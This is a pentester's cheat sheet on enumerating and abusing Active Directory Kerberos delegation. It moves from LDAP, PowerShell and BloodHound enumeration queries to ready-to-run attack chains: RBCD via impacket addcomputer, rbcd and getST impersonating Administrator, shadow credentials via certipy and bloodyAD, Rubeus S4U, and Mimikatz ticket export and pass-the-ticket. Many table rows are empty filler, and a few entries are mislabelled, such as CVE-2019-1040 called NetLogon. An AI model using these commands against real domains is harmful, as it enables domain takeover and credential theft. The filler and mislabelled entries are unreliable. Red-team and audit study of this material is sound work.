---
aliases:
  - Delegation Tooling
  - PowerView Delegation
  - certipy shadow
  - BloodHound Delegation
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Delegation Enumeration]]"
  - "[[netexec]]"
  - "[[BloodHound & SharpHound]]"
---
# AD - Delegation Enumeration - Tooling

***

## netexec / crackmapexec

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Trusted for delegation | `nxc ldap DC -u u -p p --trusted-for-delegation` | UD discovery. |
| Bulk subnet | Standard | Adjacent. |
| `cme ldap DC -u u -p p --trusted-for-delegation` | Older name | Compat. |
| Authenticated baseline | Standard | Reliable. |
| Output to file | Standard | Reportable. |
| Combine with --kerberoasting | Adjacent | Adjacent. |
| Combine with --gmsa | Adjacent | Adjacent. |
| Custom LDAP query | `--query "(filter)" "attrs"` | Flexible. |
| Forest-wide via different DCs | Per-domain | Adjacent. |
| Detection: bulk LDAP queries | Defender | Adjacent. |
| Modern netexec preferred | Standard | Standard. |
| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
| Audit baseline | Standard | Compliance. |
| Verbose `-v` | Debug | Standard. |
| `--continue-on-success` | Multi-host | Standard. |
| BloodHound integration | Adjacent | Tool. |
^ad-deleg-tool-netexec

### netexec recipes

```bash
DC="dc01.dom.local"
USER="user"; PASS="pass"

# UD discovery
nxc ldap $DC -u $USER -p $PASS --trusted-for-delegation

# Custom query: CD computers
nxc ldap $DC -u $USER -p $PASS --query \
  "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" \
  "cn,dNSHostName,msDS-AllowedToDelegateTo"

# Custom query: RBCD
nxc ldap $DC -u $USER -p $PASS --query \
  "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" \
  "cn,dNSHostName"
```

___

## RSAT / PowerShell

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `Get-ADComputer -Filter {TrustedForDelegation -eq $true}` | UD computers | Standard. |
| `Get-ADUser -Filter {TrustedForDelegation -eq $true}` | UD users (rare) | Standard. |
| `Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"}` | CD computers | Standard. |
| `Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"}` | CD users | Standard. |
| `Get-ADComputer -Properties msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD | Standard. |
| `Get-ADUser/Computer -Properties msDS-KeyCredentialLink` | Shadow Cred candidates | Standard. |
| `Set-ADAccountControl` | Modify UAC | Privileged. |
| `Set-ADComputer -PrincipalsAllowedToDelegateToAccount` | RBCD configure | Privileged. |
| `Add-ADComputer` | Create computer (RBCD prep) | Standard. |
| Cross-domain via `-Server` | Specific DC | Adjacent. |
| Modern PowerShell preferred | Standard | Standard. |
| Forest-wide via foreach | Standard | Adjacent. |
| OPSEC: native less suspicious | Standard | OPSEC. |
| Detection: bulk queries | Defender | Adjacent. |
| Audit baseline | Standard | Compliance. |
| Cross-correlate with priv | Standard | Adjacent. |
^ad-deleg-tool-rsat

### Comprehensive RSAT delegation audit

```powershell
# UD computers (excluding DCs)
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and PrimaryGroupID -ne 516} `
  -Properties TrustedForDelegation,LastLogonDate

# CD principals
Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo,UserAccountControl |
  Where {$_.'msDS-AllowedToDelegateTo'} |
  Select Name,@{n='DelegatedTo';e={$_.'msDS-AllowedToDelegateTo' -join '; '}},
    @{n='ProtocolTransition';e={($_.UserAccountControl -band 16777216) -ne 0}}

# RBCD principals
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity'}

# Shadow Credentials (KeyCredentialLink set)
Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
  Where {$_.'msDS-KeyCredentialLink'}
```

___

## PowerView (Adversary)

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `Get-NetComputer -Unconstrained` | UD computers | Adversary. |
| `Get-DomainComputer -Unconstrained` (v3) | Adjacent | Standard. |
| `Get-NetComputer -TrustedToAuth` | CD with protocol transition | Standard. |
| `Get-DomainComputer -TrustedToAuth` (v3) | Adjacent | Standard. |
| `Get-NetUser -SPN` | SPN-bound (Kerberoast adjacent) | Adjacent. |
| `Find-InterestingDomainAcl` | ACL paths to delegation modify | Adjacent. |
| `Set-DomainObject -SET` | Modify (privileged) | Privileged. |
| pywerview Linux equivalent | Adjacent | Adjacent. |
| OPSEC: in-memory load | Defender evasion | Adjacent. |
| Modern: BloodHound preferred | Standard | Tool. |
| Adjacent: ACL Enumeration hub | Cross-ref | Adjacent. |
| Detection: PowerView signatures | Defender | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Audit baseline | Standard | Compliance. |
| Custom function wrappers | DIY | Edge. |
| Cleanup: post-engagement | Standard | OPSEC. |
^ad-deleg-tool-powerview

### PowerView recipes

```powershell
Import-Module .\PowerView.ps1

# UD
Get-DomainComputer -Unconstrained -Properties cn,operatingsystem

# CD with protocol transition
Get-DomainComputer -TrustedToAuth -Properties cn,'msDS-AllowedToDelegateTo'

# Find-InterestingDomainAcl for delegation modify rights
Find-InterestingDomainAcl -ResolveGUIDs |
  Where {$_.ObjectAceType -match "DelegateTo|AllowedToAct|KeyCredential"}
```

___

## BloodHound / SharpHound

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Default collection (incl. delegation) | `SharpHound -c Default` | Standard. |
| All collection | `SharpHound -c All` | Slow. |
| RustHound (Linux) | `rusthound -d dom -u u -p p --zip` | Modern. |
| BloodHound.py | `bloodhound-python -c All` | Linux. |
| Cypher: delegation paths | Standard | Tool. |
| Visual graph | Per-edge | Tool. |
| Per-domain ingest | Multi-domain | Adjacent. |
| BHCE 6.x improved | Modern | Tool. |
| Custom analytics | Cypher | Tool. |
| Pre-built delegation queries | Standard | Tool. |
| Cross-correlate priv | Standard | Tool. |
| Detection: BloodHound collection events | Defender | Adjacent. |
| Modern: continuous BHCE | Defender | Standard. |
| Compliance: delegation baseline | Standard | Adjacent. |
| Adjacent: BloodHound hub | Cross-ref | Adjacent. |
| Modern: extreme audit | Best practice | Standard. |
^ad-deleg-tool-bh

### BloodHound delegation queries

```cypher
// All UD computers (non-DC)
MATCH (c:Computer {unconstraineddelegation: true})
WHERE NOT c.distinguishedname CONTAINS "OU=Domain Controllers"
RETURN c.name

// CD relationships
MATCH (src)-[:AllowedToDelegate]->(target)
RETURN src.name, target.name

// RBCD relationships
MATCH (src)-[:AllowedToAct|AddAllowedToAct]->(target)
RETURN src.name, target.name

// Shadow Cred capability
MATCH (src)-[:AddKeyCredentialLink]->(target)
RETURN src.name, target.name

// Comprehensive: paths via any delegation to DA
MATCH (u {owned: true}), (g:Group {name: "DOMAIN ADMINS@DOM.LOCAL"})
MATCH p=shortestPath((u)-[:AllowedToDelegate|AllowedToAct|AddAllowedToAct|AddKeyCredentialLink|MemberOf*1..]->(g))
RETURN p
```

___

## ldapsearch / Linux LDAP

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| UD computers | `(userAccountControl:1.2.840.113556.1.4.803:=524288)` | Bitwise. |
| CD principals | `(msDS-AllowedToDelegateTo=*)` | Direct. |
| Protocol transition | `(userAccountControl:1.2.840.113556.1.4.803:=16777216)` | Bitwise. |
| RBCD principals | `(msDS-AllowedToActOnBehalfOfOtherIdentity=*)` | Direct. |
| Shadow Cred candidates | `(msDS-KeyCredentialLink=*)` | Direct. |
| Authenticated bind | Standard | Reliable. |
| LDAPS | `-H ldaps://DC` | Encrypted. |
| Forest-wide via GC | `-p 3268` | Edge. |
| Output LDIF | Default | Standard. |
| Cross-domain queries | Per-DC | Adjacent. |
| Linux native | Standard | Standard. |
| Cross-correlate with priv | Standard | Audit. |
| Detection: bulk LDAP queries | Defender | Adjacent. |
| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
| Modern: bloodyAD wraps better | Standard | Standard. |
| Custom Python ldap3 | DIY | Flexible. |
^ad-deleg-tool-ldapsearch

### ldapsearch templates

```bash
LDAP="ldapsearch -h DC -D 'dom\\user' -w pass -b DC=dom,DC=local"

# UD computers (non-DC)
$LDAP "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))" \
  cn dNSHostName operatingSystem

# CD principals
$LDAP "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" \
  cn dNSHostName msDS-AllowedToDelegateTo

# Protocol transition (CD with TRUSTED_TO_AUTH)
$LDAP "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" \
  cn dNSHostName msDS-AllowedToDelegateTo

# RBCD
$LDAP "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" \
  cn dNSHostName

# Shadow Cred (KeyCredentialLink populated)
$LDAP "(&(objectCategory=user)(msDS-KeyCredentialLink=*))" \
  samAccountName
```

___

## Delegation Attack Tools

| **Tool** | **Use** | **Notas** |
|:---:|:---:|:---:|
| Rubeus s4u | CD attack (S4U2Self + S4U2Proxy) | Windows. |
| `Rubeus.exe s4u /user:svc /rc4:HASH /msdsspn:SPN /impersonateuser:user /ptt` | Standard | Standard. |
| Impacket getST | Linux S4U | Adjacent. |
| `impacket-getST -spn cifs/host -impersonate Administrator dom/svc:pass` | Standard | Standard. |
| Impacket rbcd | RBCD configure | Privileged. |
| `impacket-rbcd -delegate-from EVIL$ -delegate-to TARGET$ -action write` | Standard | Standard. |
| certipy shadow | Shadow Cred | Standard. |
| `certipy shadow auto -account victim -u user -p pass` | Standard | Standard. |
| Whisker | Windows Shadow Cred | Adjacent. |
| ntlmrelayx --shadow-credentials | Combo | Adjacent. |
| addcomputer.py | RBCD prep (create computer) | Standard. |
| Mimikatz sekurlsa::tickets | UD TGT extraction | Standard. |
| `mimikatz # sekurlsa::tickets /export` | Standard | Standard. |
| pypykatz (Linux) | Adjacent | Adjacent. |
| BloodyAD set rbcd | LDAP modify | Privileged. |
| Cross-correlate target priv | Standard | Audit. |
^ad-deleg-tool-attack

### Attack tools usage

```bash
# Linux: addcomputer + RBCD + S4U
impacket-addcomputer 'dom.local/user:pass' \
  -computer-name 'EVIL$' -computer-pass 'EvilPass123!'

impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' \
  -dc-ip DC -action write 'dom.local/user:pass'

impacket-getST -spn 'cifs/target.dom.local' \
  -impersonate Administrator \
  'dom.local/EVIL$:EvilPass123!'

# Linux: Shadow Cred via certipy
certipy shadow auto -u user@dom.local -p pass -account victim -dc-ip DC

# Windows: Rubeus s4u (CD)
Rubeus.exe s4u /user:svc-account /password:pass /msdsspn:cifs/host /impersonateuser:Administrator /ptt
```

```cmd
:: Mimikatz UD TGT extraction
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt 0;abc_administrator@krbtgt-DOM.LOCAL.kirbi
```

___

## bloodyAD (Linux LDAP Modify)

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `bloodyAD ... add rbcd target principal` | RBCD configure | Privileged. |
| `bloodyAD ... remove rbcd target principal` | Cleanup | Privileged. |
| `bloodyAD ... add shadowCredentials target` | Shadow Cred | Privileged. |
| `bloodyAD ... add genericAll target principal` | Adjacent ACL | Privileged. |
| `bloodyAD ... get object DN --resolve-sd` | Read DACL | Standard. |
| Linux-friendly | Standard | Standard. |
| Authenticated NTLM/Kerberos | Standard | Standard. |
| LDAPS support | Modern | Standard. |
| Cross-domain | Per-domain | Adjacent. |
| Modern Linux preferred | Standard | Standard. |
| Adjacent: ACL Enumeration hub | Cross-ref | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Cleanup: revert modifications | Standard | OPSEC. |
| Detection: bulk LDAP modify | Defender | Adjacent. |
| Audit baseline | Standard | Compliance. |
| Cross-correlate priv | Standard | Audit. |
^ad-deleg-tool-bloodyad

### bloodyAD delegation

```bash
# Configure RBCD (privileged abuse)
bloodyAD --host DC -d dom -u user -p pass \
  add rbcd target_computer attacker_computer

# Add Shadow Credentials
bloodyAD --host DC -d dom -u user -p pass \
  add shadowCredentials victim_user

# Cleanup
bloodyAD --host DC -d dom -u user -p pass \
  remove rbcd target_computer attacker_computer
```

___

## Wordlists & Recursos

| **Recurso** | **URL / Path** | **Notas** |
|:---:|:---:|:---:|
| HackTricks - Delegation | `book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation` | Reference. |
| The Hacker Recipes - Kerberos | `thehacker.recipes/ad/movement/kerberos` | Comprehensive. |
| ADSecurity (Sean Metcalf) | `adsecurity.org` | Defender intel. |
| BloodHound docs | `bloodhound.specterops.io` | Tool docs. |
| Will Schroeder - "Wagging the Dog" | Specter Ops blog | RBCD research. |
| Elad Shamir - RBCD research | adjacent | Research. |
| Microsoft - Kerberos delegation | learn.microsoft.com | Vendor. |
| Certipy docs | `github.com/ly4k/Certipy` | Tool. |
| Whisker (Windows Shadow Cred) | `github.com/eladshamir/Whisker` | Tool. |
| Microsoft Defender for Identity delegation alerts | Modern | Defender. |
| PingCastle | `www.pingcastle.com` | Audit. |
| Purple Knight | `www.semperis.com/purple-knight/` | Audit. |
| MITRE ATT&CK T1558 | Steal or Forge Kerberos Tickets | Adjacent. |
| `awesome-active-directory` | GitHub | Foundation. |
| KB4490425 (TGT delegation patch) | Microsoft KB | Reference. |
| CVE-2019-1040 | NetLogon | Adjacent. |
^ad-deleg-tool-resources

***
